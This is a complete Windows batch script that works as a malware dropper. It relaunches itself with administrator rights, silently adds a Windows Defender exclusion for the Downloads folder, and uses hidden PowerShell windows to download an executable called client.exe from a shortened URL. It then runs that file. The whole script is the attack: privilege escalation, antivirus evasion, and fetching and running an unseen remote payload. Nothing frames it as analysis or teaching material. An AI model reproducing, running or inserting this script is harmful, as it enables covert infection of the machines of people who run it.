@echo off
:: Ensure the script is run as Administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Define variables
set "url=https://shorturl44.at/zaccJ"
set "output=%USERPROFILE%\Downloads\client.exe"
set "downloads=%USERPROFILE%\Downloads"

:: Add Defender exclusion (optional, but now silent)
powershell -NoProfile -WindowStyle Hidden -Command ^
 "Try { Add-MpPreference -ExclusionPath '%downloads%' } Catch {}"

:: Download the file
echo Downloading...
powershell -NoProfile -WindowStyle Hidden -Command ^
 "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"

:: Run the downloaded file
start "" "%output%"
exit
